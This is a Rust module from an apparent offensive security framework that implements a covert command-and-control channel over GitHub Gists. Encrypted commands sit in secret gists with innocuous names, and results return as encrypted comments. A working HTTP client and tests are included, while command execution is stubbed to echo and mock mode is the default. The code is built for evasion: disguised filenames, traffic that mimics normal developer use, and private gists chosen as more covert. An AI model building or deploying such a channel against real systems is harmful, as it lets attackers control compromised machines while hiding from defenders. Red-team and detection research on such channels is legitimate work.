//! GitHub Gists C2 - Covert Command & Control via GitHub Gists
//!
//! Uses GitHub Gists as a dead-drop communication channel for command and control.
//! Commands are stored in Gist files (encrypted), and results are posted as Gist comments.
//! This blends into normal developer traffic and leverages GitHub's infrastructure.
//!
//! **SECURITY NOTICE**: This module is designed for AUTHORIZED penetration testing,
//! red team exercises, and security research ONLY. Requires explicit written permission.
//!
//! Features:
//! - Creates secret Gists with innocuous filenames (e.g., "notes.txt", "config.json")
//! - Embeds AES-GCM encrypted commands in Gist content
//! - Polls GitHub API every 30s (configurable)
//! - Posts encrypted results as Gist comments
//! - Mimics legitimate GitHub API traffic patterns
//! - Mock mode for safe offline testing
//!
//! Requirements:
//! - Valid GitHub Personal Access Token (PAT) with gist scope
//! - Or GitHub OAuth token with gist permissions
//!
//! Mock Mode:
//! - Set `mock_mode: true` in options
//! - Simulates GitHub API locally without network calls
//! - Safe for development and testing

use anyhow::{Context, Result, anyhow, bail};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::{Duration, Instant};

use crate::core::module::{
    CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType,
};
use crate::infra::crypto::{AES_KEY_LEN, HMAC_KEY_LEN, aes_decrypt, aes_encrypt, derive_keys};

/// GitHub API base URL
const GITHUB_API_BASE: &str = "https://api.github.com";

/// Default poll interval (30 seconds)
const DEFAULT_POLL_INTERVAL_SECS: u64 = 30;

/// GitHub Gist metadata
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Gist {
    pub id: String,
    pub description: String,
    pub public: bool,
    pub files: HashMap<String, GistFile>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub html_url: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GistFile {
    pub filename: String,
    pub content: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub raw_url: Option<String>,
}

/// Request payload for creating a Gist
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CreateGistRequest {
    pub description: String,
    pub public: bool,
    pub files: HashMap<String, CreateGistFile>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CreateGistFile {
    pub content: String,
}

/// Gist comment
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GistComment {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub id: Option<i64>,
    pub body: String,
}

/// Abstract GitHub API client for testability
#[async_trait]
trait GitHubApiClient: Send + Sync {
    async fn create_gist(&self, token: &str, req: &CreateGistRequest) -> Result<Gist>;
    async fn get_gist(&self, token: &str, gist_id: &str) -> Result<Gist>;
    async fn update_gist(
        &self,
        token: &str,
        gist_id: &str,
        req: &CreateGistRequest,
    ) -> Result<Gist>;
    async fn create_comment(
        &self,
        token: &str,
        gist_id: &str,
        comment: &str,
    ) -> Result<GistComment>;
    async fn list_comments(&self, token: &str, gist_id: &str) -> Result<Vec<GistComment>>;
}

/// Production HTTP client using reqwest
struct HttpGitHubClient;

#[async_trait]
impl GitHubApiClient for HttpGitHubClient {
    async fn create_gist(&self, token: &str, req: &CreateGistRequest) -> Result<Gist> {
        let client = reqwest::Client::new();
        let resp = client
            .post(&format!("{}/gists", GITHUB_API_BASE))
            .header("Authorization", format!("Bearer {}", token))
            .header("User-Agent", "ferox-security-framework")
            .header("Accept", "application/vnd.github+json")
            .json(req)
            .send()
            .await
            .context("Failed to create Gist")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("GitHub API error {}: {}", status, body);
        }

        resp.json::<Gist>()
            .await
            .context("Failed to parse Gist response")
    }

    async fn get_gist(&self, token: &str, gist_id: &str) -> Result<Gist> {
        let client = reqwest::Client::new();
        let url = format!("{}/gists/{}", GITHUB_API_BASE, gist_id);
        let resp = client
            .get(&url)
            .header("Authorization", format!("Bearer {}", token))
            .header("User-Agent", "ferox-security-framework")
            .header("Accept", "application/vnd.github+json")
            .send()
            .await
            .context("Failed to get Gist")?;

        if !resp.status().is_success() {
            bail!("Failed to get Gist: {}", resp.status());
        }

        resp.json::<Gist>().await.context("Failed to parse Gist")
    }

    async fn update_gist(
        &self,
        token: &str,
        gist_id: &str,
        req: &CreateGistRequest,
    ) -> Result<Gist> {
        let client = reqwest::Client::new();
        let url = format!("{}/gists/{}", GITHUB_API_BASE, gist_id);
        let resp = client
            .patch(&url)
            .header("Authorization", format!("Bearer {}", token))
            .header("User-Agent", "ferox-security-framework")
            .header("Accept", "application/vnd.github+json")
            .json(req)
            .send()
            .await
            .context("Failed to update Gist")?;

        if !resp.status().is_success() {
            bail!("Failed to update Gist: {}", resp.status());
        }

        resp.json::<Gist>()
            .await
            .context("Failed to parse updated Gist")
    }

    async fn create_comment(
        &self,
        token: &str,
        gist_id: &str,
        comment: &str,
    ) -> Result<GistComment> {
        let client = reqwest::Client::new();
        let url = format!("{}/gists/{}/comments", GITHUB_API_BASE, gist_id);

        let body = serde_json::json!({ "body": comment });

        let resp = client
            .post(&url)
            .header("Authorization", format!("Bearer {}", token))
            .header("User-Agent", "ferox-security-framework")
            .header("Accept", "application/vnd.github+json")
            .json(&body)
            .send()
            .await
            .context("Failed to create comment")?;

        if !resp.status().is_success() {
            bail!("Failed to create comment: {}", resp.status());
        }

        resp.json::<GistComment>()
            .await
            .context("Failed to parse comment response")
    }

    async fn list_comments(&self, token: &str, gist_id: &str) -> Result<Vec<GistComment>> {
        let client = reqwest::Client::new();
        let url = format!("{}/gists/{}/comments", GITHUB_API_BASE, gist_id);
        let resp = client
            .get(&url)
            .header("Authorization", format!("Bearer {}", token))
            .header("User-Agent", "ferox-security-framework")
            .header("Accept", "application/vnd.github+json")
            .send()
            .await
            .context("Failed to list comments")?;

        if !resp.status().is_success() {
            bail!("Failed to list comments: {}", resp.status());
        }

        resp.json::<Vec<GistComment>>()
            .await
            .context("Failed to parse comments")
    }
}

/// Mock GitHub API client for safe testing
struct MockGitHubClient {
    gists: Arc<Mutex<HashMap<String, Gist>>>,
    comments: Arc<Mutex<HashMap<String, Vec<GistComment>>>>,
    last_command_file: Arc<Mutex<Option<String>>>,
}

impl MockGitHubClient {
    fn new() -> Self {
        Self {
            gists: Arc::new(Mutex::new(HashMap::new())),
            comments: Arc::new(Mutex::new(HashMap::new())),
            last_command_file: Arc::new(Mutex::new(None)),
        }
    }

    /// Inject a command into the Gist (for testing)
    async fn inject_command(&self, gist_id: &str, filename: &str, content: &str) {
        if let Some(gist) = self.gists.lock().await.get_mut(gist_id) {
            if let Some(file) = gist.files.get_mut(filename) {
                file.content = content.to_string();
            }
        }
        *self.last_command_file.lock().await = Some(content.to_string());
    }

    /// Get all comments for testing
    async fn get_comments(&self, gist_id: &str) -> Vec<GistComment> {
        self.comments
            .lock()
            .await
            .get(gist_id)
            .cloned()
            .unwrap_or_default()
    }
}

#[async_trait]
impl GitHubApiClient for MockGitHubClient {
    async fn create_gist(&self, _token: &str, req: &CreateGistRequest) -> Result<Gist> {
        let gist_id = format!("mock-gist-{}", uuid::Uuid::new_v4());

        let mut files = HashMap::new();
        for (name, file) in &req.files {
            files.insert(
                name.clone(),
                GistFile {
                    filename: name.clone(),
                    content: file.content.clone(),
                    raw_url: Some(format!("https://gist.github.com/{}/{}", gist_id, name)),
                },
            );
        }

        let gist = Gist {
            id: gist_id.clone(),
            description: req.description.clone(),
            public: req.public,
            files,
            html_url: Some(format!("https://gist.github.com/{}", gist_id)),
        };

        self.gists
            .lock()
            .await
            .insert(gist_id.clone(), gist.clone());
        self.comments.lock().await.insert(gist_id, Vec::new());
        Ok(gist)
    }

    async fn get_gist(&self, _token: &str, gist_id: &str) -> Result<Gist> {
        self.gists
            .lock()
            .await
            .get(gist_id)
            .cloned()
            .ok_or_else(|| anyhow!("Gist not found"))
    }

    async fn update_gist(
        &self,
        _token: &str,
        gist_id: &str,
        req: &CreateGistRequest,
    ) -> Result<Gist> {
        let mut gists = self.gists.lock().await;
        if let Some(gist) = gists.get_mut(gist_id) {
            gist.description = req.description.clone();
            for (name, file) in &req.files {
                if let Some(existing) = gist.files.get_mut(name) {
                    existing.content = file.content.clone();
                }
            }
            Ok(gist.clone())
        } else {
            bail!("Gist not found")
        }
    }

    async fn create_comment(
        &self,
        _token: &str,
        gist_id: &str,
        comment: &str,
    ) -> Result<GistComment> {
        let comment_obj = GistComment {
            id: Some(chrono::Utc::now().timestamp_millis()),
            body: comment.to_string(),
        };

        self.comments
            .lock()
            .await
            .entry(gist_id.to_string())
            .or_insert_with(Vec::new)
            .push(comment_obj.clone());

        Ok(comment_obj)
    }

    async fn list_comments(&self, _token: &str, gist_id: &str) -> Result<Vec<GistComment>> {
        Ok(self
            .comments
            .lock()
            .await
            .get(gist_id)
            .cloned()
            .unwrap_or_default())
    }
}

/// GitHub Gists C2 Module
pub struct GitHubC2 {
    options: HashMap<String, String>,
    client: Arc<dyn GitHubApiClient>,
    enc_key: Option<[u8; AES_KEY_LEN]>,
    _hmac_key: Option<[u8; HMAC_KEY_LEN]>,
}

impl GitHubC2 {
    pub fn new() -> Self {
        let mut options = HashMap::new();
        options.insert("access_token".to_string(), String::new());
        options.insert(
            "gist_description".to_string(),
            "Development notes".to_string(),
        );
        options.insert("gist_filename".to_string(), "notes.txt".to_string());
        options.insert(
            "poll_interval".to_string(),
            DEFAULT_POLL_INTERVAL_SECS.to_string(),
        );
        options.insert("mock_mode".to_string(), "true".to_string());
        options.insert("encryption_key".to_string(), String::new());
        options.insert("max_iterations".to_string(), "3".to_string());
        options.insert("public_gist".to_string(), "false".to_string());

        Self {
            options,
            client: Arc::new(MockGitHubClient::new()),
            enc_key: None,
            _hmac_key: None,
        }
    }

    /// Initialize crypto keys from password
    fn init_crypto(&mut self, password: &str) -> Result<()> {
        let keys = derive_keys(password.as_bytes(), b"ferox-github-salt")?;
        self.enc_key = Some(keys.enc_key);
        self._hmac_key = Some(keys.hmac_key);
        Ok(())
    }

    /// Encrypt command for embedding in Gist
    fn encrypt_command(&self, cmd: &str) -> Result<String> {
        use base64::Engine;
        let enc_key = self
            .enc_key
            .as_ref()
            .ok_or_else(|| anyhow!("Encryption not initialized"))?;
        let aad = b"github-c2";
        let (nonce, ciphertext) = aes_encrypt(enc_key, cmd.as_bytes(), aad)?;

        // Encode as base64 for text storage
        let mut combined = Vec::new();
        combined.extend_from_slice(&nonce);
        combined.extend_from_slice(&ciphertext);
        Ok(base64::engine::general_purpose::STANDARD.encode(&combined))
    }

    /// Decrypt command from Gist content
    fn decrypt_command(&self, encrypted: &str) -> Result<String> {
        use base64::Engine;
        let enc_key = self
            .enc_key
            .as_ref()
            .ok_or_else(|| anyhow!("Encryption not initialized"))?;
        let combined = base64::engine::general_purpose::STANDARD
            .decode(encrypted)
            .context("Invalid base64")?;

        if combined.len() < 12 {
            bail!("Invalid encrypted command length");
        }

        let (nonce_bytes, ciphertext) = combined.split_at(12);
        let mut nonce = [0u8; 12];
        nonce.copy_from_slice(nonce_bytes);

        let aad = b"github-c2";
        let plaintext = aes_decrypt(enc_key, &nonce, ciphertext, aad)?;
        String::from_utf8(plaintext).context("Invalid UTF-8 in decrypted command")
    }

    /// Execute a single C2 tick: check for commands, execute, report back
    async fn tick(&self, gist_id: &str, filename: &str, token: &str) -> Result<()> {
        // Get Gist to check for commands
        let gist = self.client.get_gist(token, gist_id).await?;

        // Check if file contains encrypted command
        if let Some(file) = gist.files.get(filename) {
            let content = file.content.trim();

            // Check for encrypted command marker
            if content.starts_with("ENCRYPTED:") {
                let encrypted = content.strip_prefix("ENCRYPTED:").unwrap_or("");
                if !encrypted.is_empty() {
                    // Decrypt command
                    let cmd = self.decrypt_command(encrypted)?;

                    // Execute command (simplified - just echo for safety)
                    let result = self.execute_command(&cmd).await?;

                    // Post result as encrypted comment
                    let encrypted_result = self.encrypt_command(&result)?;
                    self.client
                        .create_comment(token, gist_id, &format!("RESULT:{}", encrypted_result))
                        .await?;

                    // Clear command by resetting file content
                    let original_desc = self
                        .options
                        .get("gist_description")
                        .cloned()
                        .unwrap_or_default();

                    let mut files = HashMap::new();
                    files.insert(
                        filename.to_string(),
                        CreateGistFile {
                            content: "# Waiting for commands...".to_string(),
                        },
                    );

                    let update_req = CreateGistRequest {
                        description: original_desc,
                        public: false,
                        files,
                    };

                    self.client.update_gist(token, gist_id, &update_req).await?;
                }
            }
        }

        Ok(())
    }

    /// Execute command (mock implementation for safety)
    async fn execute_command(&self, cmd: &str) -> Result<String> {
        // SAFE IMPLEMENTATION: Only echo commands, never actually execute
        Ok(format!("[MOCK] Received command: {}", cmd))
    }

    /// Run C2 loop
    async fn run_c2_loop(&self, token: &str, max_iterations: usize) -> Result<ModuleResult> {
        // Create dead-drop Gist
        let gist_desc = self
            .options
            .get("gist_description")
            .cloned()
            .unwrap_or_default();
        let filename = self
            .options
            .get("gist_filename")
            .cloned()
            .unwrap_or_default();
        let public = self
            .options
            .get("public_gist")
            .map(|s| s == "true")
            .unwrap_or(false);

        let mut files = HashMap::new();
        files.insert(
            filename.clone(),
            CreateGistFile {
                content: "# Waiting for commands...".to_string(),
            },
        );

        let create_req = CreateGistRequest {
            description: gist_desc,
            public,
            files,
        };

        let gist = self.client.create_gist(token, &create_req).await?;
        let gist_id = gist.id.clone();

        let poll_interval = self
            .options
            .get("poll_interval")
            .and_then(|s| s.parse::<u64>().ok())
            .unwrap_or(DEFAULT_POLL_INTERVAL_SECS);

        let mut data = HashMap::new();
        data.insert("gist_id".to_string(), gist_id.clone());
        data.insert("gist_url".to_string(), gist.html_url.unwrap_or_default());

        // Poll for commands (limited iterations in module run)
        let mut iteration = 0;
        let start_time = Instant::now();

        while iteration < max_iterations {
            match self.tick(&gist_id, &filename, token).await {
                Ok(_) => {
                    iteration += 1;
                }
                Err(e) => {
                    data.insert("error".to_string(), e.to_string());
                    break;
                }
            }

            tokio::time::sleep(Duration::from_secs(poll_interval)).await;
        }

        data.insert("iterations".to_string(), iteration.to_string());
        data.insert(
            "duration_secs".to_string(),
            start_time.elapsed().as_secs().to_string(),
        );

        let mut result = ModuleResult::success("GitHub Gists C2 session completed".to_string());
        for (key, value) in data {
            result = result.with_data(&key, serde_json::Value::String(value));
        }
        Ok(result)
    }
}

impl Default for GitHubC2 {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Module for GitHubC2 {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            name: "github_c2".to_string(),
            version: "1.0.0".to_string(),
            author: "Ferox Security Team".to_string(),
            description: "Covert C2 channel using GitHub Gists as dead-drop communication. \
                         AUTHORIZED USE ONLY - Requires explicit permission."
                .to_string(),
            module_type: ModuleType::PostExploit,
            category: "c2".to_string(),
        }
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "access_token".to_string(),
                description: "GitHub Personal Access Token (PAT) with gist scope".to_string(),
                required: true,
                default_value: None,
                current_value: self.options.get("access_token").cloned(),
            },
            ModuleOption {
                name: "gist_description".to_string(),
                description: "Innocuous Gist description for cover".to_string(),
                required: false,
                default_value: Some("Development notes".to_string()),
                current_value: self.options.get("gist_description").cloned(),
            },
            ModuleOption {
                name: "gist_filename".to_string(),
                description: "Filename within the Gist".to_string(),
                required: false,
                default_value: Some("notes.txt".to_string()),
                current_value: self.options.get("gist_filename").cloned(),
            },
            ModuleOption {
                name: "poll_interval".to_string(),
                description: "Polling interval in seconds".to_string(),
                required: false,
                default_value: Some(DEFAULT_POLL_INTERVAL_SECS.to_string()),
                current_value: self.options.get("poll_interval").cloned(),
            },
            ModuleOption {
                name: "mock_mode".to_string(),
                description: "Use mock GitHub API (true/false) for safe testing".to_string(),
                required: false,
                default_value: Some("true".to_string()),
                current_value: self.options.get("mock_mode").cloned(),
            },
            ModuleOption {
                name: "encryption_key".to_string(),
                description: "Password for command encryption (derived via HKDF)".to_string(),
                required: true,
                default_value: None,
                current_value: self.options.get("encryption_key").cloned(),
            },
            ModuleOption {
                name: "max_iterations".to_string(),
                description: "Maximum polling iterations (for module run, not background)"
                    .to_string(),
                required: false,
                default_value: Some("3".to_string()),
                current_value: self.options.get("max_iterations").cloned(),
            },
            ModuleOption {
                name: "public_gist".to_string(),
                description: "Create public Gist (true/false) - false is more covert".to_string(),
                required: false,
                default_value: Some("false".to_string()),
                current_value: self.options.get("public_gist").cloned(),
            },
        ]
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<()> {
        self.options.insert(name.to_string(), value.to_string());
        Ok(())
    }

    fn get_option(&self, name: &str) -> Option<String> {
        self.options.get(name).cloned()
    }

    fn validate(&self) -> Result<()> {
        // Check required options
        let token = self
            .options
            .get("access_token")
            .ok_or_else(|| anyhow!("access_token required"))?;
        if token.is_empty() {
            bail!("access_token cannot be empty");
        }

        let enc_key = self
            .options
            .get("encryption_key")
            .ok_or_else(|| anyhow!("encryption_key required"))?;
        if enc_key.is_empty() {
            bail!("encryption_key cannot be empty");
        }

        Ok(())
    }

    async fn check(&self) -> Result<CheckResult> {
        // Non-destructive check: verify GitHub API accessibility (mock mode only)
        let mock_mode = self
            .options
            .get("mock_mode")
            .map(|s| s == "true")
            .unwrap_or(true);

        if mock_mode {
            let mut fingerprint = HashMap::new();
            fingerprint.insert("mode".to_string(), "mock".to_string());
            fingerprint.insert("status".to_string(), "safe_for_testing".to_string());

            Ok(CheckResult {
                vulnerable: true,
                confidence: 0.9,
                details: "Mock mode enabled - safe for testing".to_string(),
                fingerprint,
            })
        } else {
            let mut fingerprint = HashMap::new();
            fingerprint.insert("mode".to_string(), "production".to_string());

            Ok(CheckResult {
                vulnerable: false,
                confidence: 0.0,
                details: "Production mode - requires valid GitHub PAT".to_string(),
                fingerprint,
            })
        }
    }

    async fn run(&mut self) -> Result<ModuleResult> {
        // Initialize encryption
        let enc_key = self
            .options
            .get("encryption_key")
            .cloned()
            .ok_or_else(|| anyhow!("encryption_key not set"))?;
        self.init_crypto(&enc_key)?;

        // Switch to real client if not in mock mode
        let mock_mode = self
            .options
            .get("mock_mode")
            .map(|s| s == "true")
            .unwrap_or(true);

        if !mock_mode {
            self.client = Arc::new(HttpGitHubClient);
        }

        let token = self
            .options
            .get("access_token")
            .cloned()
            .ok_or_else(|| anyhow!("access_token not set"))?;

        let max_iterations = self
            .options
            .get("max_iterations")
            .and_then(|s| s.parse::<usize>().ok())
            .unwrap_or(3);

        self.run_c2_loop(&token, max_iterations).await
    }

    async fn cleanup(&mut self) -> Result<()> {
        // In production, could delete the Gist here
        // For safety, we skip this in mock mode
        Ok(())
    }

    fn requires_confirmation(&self) -> bool {
        // This is a C2 module - always require confirmation
        true
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_github_c2_mock_mode() {
        let mut module = GitHubC2::new();
        module
            .set_option("access_token", "ghp_mock_token_123456")
            .unwrap();
        module
            .set_option("encryption_key", "test-password-123")
            .unwrap();
        module.set_option("mock_mode", "true").unwrap();
        module.set_option("max_iterations", "1").unwrap();

        assert!(module.validate().is_ok());

        let result = module.run().await.unwrap();
        assert!(result.success);
        assert!(result.data.contains_key("gist_id"));
        assert!(result.data.contains_key("gist_url"));
    }

    #[tokio::test]
    async fn test_encryption_round_trip() {
        let mut module = GitHubC2::new();
        module.init_crypto("test-password").unwrap();

        let cmd = "whoami";
        let encrypted = module.encrypt_command(cmd).unwrap();
        let decrypted = module.decrypt_command(&encrypted).unwrap();

        assert_eq!(cmd, decrypted);
    }

    #[tokio::test]
    async fn test_command_execution_flow() {
        let mock_client = Arc::new(MockGitHubClient::new());
        let mut module = GitHubC2::new();
        module.client = mock_client.clone();
        module.init_crypto("test-pass").unwrap();

        // Create a Gist
        let mut files = HashMap::new();
        files.insert(
            "notes.txt".to_string(),
            CreateGistFile {
                content: "# Test".to_string(),
            },
        );
        let req = CreateGistRequest {
            description: "Test".to_string(),
            public: false,
            files,
        };
        let gist = mock_client.create_gist("token", &req).await.unwrap();

        // Inject an encrypted command
        let encrypted_cmd = module.encrypt_command("test-command").unwrap();
        mock_client
            .inject_command(
                &gist.id,
                "notes.txt",
                &format!("ENCRYPTED:{}", encrypted_cmd),
            )
            .await;

        // Run one tick
        module.tick(&gist.id, "notes.txt", "token").await.unwrap();

        // Check that a comment was posted
        let comments = mock_client.get_comments(&gist.id).await;
        assert!(!comments.is_empty());
        assert!(comments[0].body.starts_with("RESULT:"));
    }

    #[test]
    fn test_module_info() {
        let module = GitHubC2::new();
        let info = module.info();
        assert_eq!(info.name, "github_c2");
        assert!(info.description.contains("AUTHORIZED"));
    }
}
